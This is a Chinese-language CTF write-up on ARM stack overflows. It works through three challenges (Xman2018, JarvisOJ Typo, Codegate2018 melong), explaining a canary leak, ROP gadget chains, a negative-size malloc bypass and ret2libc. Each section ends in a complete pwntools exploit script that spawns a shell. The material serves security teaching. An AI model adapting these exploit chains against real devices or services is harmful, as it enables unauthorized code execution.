# 从三道CTF赛题看arm栈溢出
> 偏有宸机
> 来源：https://www.iotsec-zone.com/article/43

## Xman2018-pwn

程序开启了canary保护，不过存在两次输入的情况，可以利用第一次的输入来带出canary的值，用于第二次输入时的溢出。

经过在gdb中的测试可得知前面填充`0x18`个字符串，即可带出`canary`的值
![0.png](https://www.iotsec-zone.com/images/MdImg/6f9f7bfd09277684c35a8fa5e1af11ee.png)

之后由于程序中存在`system`和`/bin/sh`字符串的原因，我们可以直接拼接rop来完成溢出
但前提是我们需要有足够的gadgets来保持堆栈平衡，而构造rop的结构则应该为
```
R0 -> /bin/sh
Pc -> system_plt
```
但是由于找不到`pop r0`寄存器的原因，则只能迂回利用r7寄存器保存/bin/sh字符串，再通过`mov r0，r7 `来保存到r0 寄存器中

因此需要先找到下面三条gadgets
```
pop_r3_pc = 0x000104a8           #   0x000104a8 : pop {r3, pc}
pop_r4_to_pc = 0x00010804            #   0x00010804 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
mov_r0_r7_call = 0x000107f4      #   0x000107f4 : mov r0, r7 ; blx r3
```
 ![1.png](https://www.iotsec-zone.com/images/MdImg/16e04328a63b42b944e9a7f714ee5b19.png) 

最终的exp：

```
from pwn import *
context.arch="arm"
context.log_level = "debug"
# context.terminal = ["tmux","new-window"]
fileName = "./pwn"
sh = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", fileName])
# sh = process(["qemu-arm","-g","1234","-L", "/usr/arm-linux-gnueabi", fileName])
elf = ELF(fileName)
libc = ELF("/usr/arm-linux-gnueabi/lib/libc.so.6")
# p = remote('39.105.216.229', 9991)
# sh.recvline()
sh.send("a" * 20)
sh.recvuntil("\x61\x61\x61\x00")
canary = u32(sh.recv(4))
sh.recv(4)
success(hex(canary))
print(sh.recvuntil("Come"))

system = 0x00104FC     
binsh =  0x21044
pop_r3_pc = 0x000104a8           #   0x000104a8 : pop {r3, pc}
pop_r4_to_pc = 0x00010804     #   0x00010804 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
mov_r0_r7_call = 0x000107f4      #   0x000107f4 : mov r0, r7 ; blx r3

payload = p32(pop_r4_to_pc)
payload += p32(0)       # R4
payload += p32(0)       # R5
payload += p32(0)       # R6
payload += p32(binsh)   # R7
payload += p32(0)       # R8
payload += p32(0)       # SB
payload += p32(0)       # SL
payload += p32(pop_r3_pc)
payload += p32(system)
payload += p32(mov_r0_r7_call)
pay = b'A' * 24 + p32(canary) + p32(0xdeadbeef) + payload

sh.sendline(pay)
sh.interactive()
```
## JarvisOJ-Typo

首先是程序被剥离了符号表，但是通过程序中的`/bin/sh`字符串的交叉引用可以推测出`0x110b4`便是system函数
![2.png](https://www.iotsec-zone.com/images/MdImg/d56e757dd1fc24bc2562dca5b152426b.png) 
之后就是确定程序的溢出点，对此我们可以直接使用cyclic来在gdb中测试
同样的要先使用`qemu-arm -g` 加端口，在用`gdb-multiarch`来打开gdb设置参数进行测试
![3.png](https://www.iotsec-zone.com/images/MdImg/8f8eeaaa485a856e71b3b3528061943e.png) 

最后得出偏移为`112`

之后我们使用ROPGadget工具来找到可以控制r0寄存器的gadgets
![4.png](https://www.iotsec-zone.com/images/MdImg/97eb15a285279bb3e477c256a9d827f5.png)
得到的是`pop r0,r4,pc`，那么我们所应构造的rop结构则应为
![5.png](https://www.iotsec-zone.com/images/MdImg/e3f06940490e5a28c22cdf81c21a9912.png)
![6.png](https://www.iotsec-zone.com/images/MdImg/5c90469d2c269ace2c9f3173e38a070d.png) 
注意：

在写exp调试时，可以通过pause来下断点 同时exp中的process要加上端口

最后再在gdb中continue即可断下
```
from pwn import *
context.arch="arm"
# context.log_level = "debug"
# context.terminal = ["tmux","new-window"]
fileName = "./typo"
sh = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", fileName])
# sh = process(["qemu-arm","-g","1234","-L", "/usr/arm-linux-gnueabi", fileName])
elf = ELF(fileName)
libc = ELF("/usr/arm-linux-gnueabi/lib/libc.so.6")

binsh = 0x0006c384      #0x0006c384 : /bin/sh
pop_r0_r4_pc = 0x20904  #0x00020904 : pop {r0, r4, pc}
system = 0x110B4
sh.sendafter("quit\n", "\n")
sh.recvline()
sh.recvuntil("\n")
pause()
payload = b"a"*112
payload += p32(pop_r0_r4_pc)
payload += p32(binsh)
payload += p32(binsh)
payload += p32(system)
sh.sendline(payload)
sh.interactive()
```
## [ret2libc]Codegate2018-melong

使用ida分析，乍一看似乎没什么漏洞点，但是仔细分析到选项4的`write_diary`中

可以看到其read的参数都可以由用户来控制，那么便意味着我们可以控制其进行溢出

![7.png](https://www.iotsec-zone.com/images/MdImg/ef86dcfe407f433b1c205c2804411a2b.png) 
但是要执行到该函数的话，是需要条件的，一步步向上分析可以先看到 我们需要先让`write_size `这个变量不能为0，而这个write_size的值则是由选项3中的PT函数控制的。

![8.png](https://www.iotsec-zone.com/images/MdImg/07fff52a7eef946acf16ed8d950d40a3.png) 
进到PT函数中，会让用户输入一个size，再拿由size申请的一块地址与exc2变量的值做比较，相等才可以进入该分支。

而这里的绕过ptr==exc2的方法原理很简单，我们可以输入一个负值的size，之后malloc（-x）的结果就不会成立，其ptr便会等于0，所以ptr便等于了exc2的同时size还能有一个较大的值用于后面的溢出。

![9.png](https://www.iotsec-zone.com/images/MdImg/cf80edc3340e2f632cf370ba68802228.png) 
之后就可以正常进行溢出了，但是需要注意，要实现控制pc需要在选项4中填充完数据后，再执行选项6才可以完成溢出
![10.png](https://www.iotsec-zone.com/images/MdImg/9867c16132940d37b6eb1ca78cbe9118.png) 
## 需要注意的两点

1. 在第一次溢出完返回main函数的时候若要控制需要有28字节的填充数据用于覆盖r4-r10寄存器即 7*4=28（如果不确定具体是多少位，可以使用cyclic来测试）
![11.png](https://www.iotsec-zone.com/images/MdImg/52825245daad50f95539a92048757ba3.png) 

2. 不清楚为什么在使用libc.search搜索“/bin/sh”字符串得到的结果是这样的，而且不能用.next()方法
![12.png](https://www.iotsec-zone.com/images/MdImg/2dce3d5fdbe4f1737021c5af4c762364.png) 
最后手动搜索，加上libc_base即可
![13.png](https://www.iotsec-zone.com/images/MdImg/79792835cea3beb5a21fc3cbd2e0ea0d.png) 


exp:
```
from pwn import *
context.arch="arm"
context.log_level = "debug"
# context.terminal = ["tmux","new-window"]
fileName = "./melong"
# sh = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", fileName])
sh = process(["qemu-arm","-g","1234","-L", "/usr/arm-linux-gnueabi", fileName])
elf = ELF(fileName)
libc = ELF("/usr/arm-linux-gnueabi/lib/libc.so.6")
def checkBmi(height,weight):
    sh.recvuntil("Type the number:")
    sh.sendline("1")
    sh.sendlineafter("meters) : ",str(height))
    sh.sendlineafter("kilograms) : ",str(weight))
def register(size):
    sh.recvuntil("Type the number:")
    sh.sendline("3")
    sh.sendlineafter("training?\n",str(size))
def write_daily(daily):
    sh.recvuntil("Type the number:")
    sh.sendline("4")
    sh.sendline(daily)
    sh.recvuntil("Type the number:")
    sh.sendline("6")

checkBmi(20,20)
register(-10)
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main_addr = elf.sym["main"]
success("puts_got => 0x%x",puts_got)
pop_r0_pc = 0x11bbc    # 0x00011bbc : pop {r0, pc}
payload = b"a"*84
payload += p32(pop_r0_pc)
payload += p32(puts_got)
payload += p32(puts_plt)
payload += b"a"*28  # r4 - r10
payload += p32(main_addr)
write_daily(payload)
sh.recvuntil("See you again :)\n")
puts_addr = u32(sh.recv(4))
success("puts_addr => 0x%x",puts_addr)
# pause()
libc_base = puts_addr - libc.sym["puts"]
system_addr = libc.sym["system"]+libc_base 
# print(libc.search("/bin/sh"))
# binsh = libc.search("$0") + libc_base
success("system_addr => 0x%x",system_addr)
checkBmi(20,20)
register(-1)
payload = b"a"*84
payload += p32(pop_r0_pc)
payload += p32(libc_base + 0x12121c)    #  0x0012121c : /bin/sh
payload += p32(system_addr)
# write_daily(payload)
sh.recvuntil("Type the number:")
sh.sendline("4")
sh.sendline(payload)
pause()
sh.recvuntil("Type the number:")
sh.sendline("6")

# sh.sendline(payload)
sh.interactive()

```





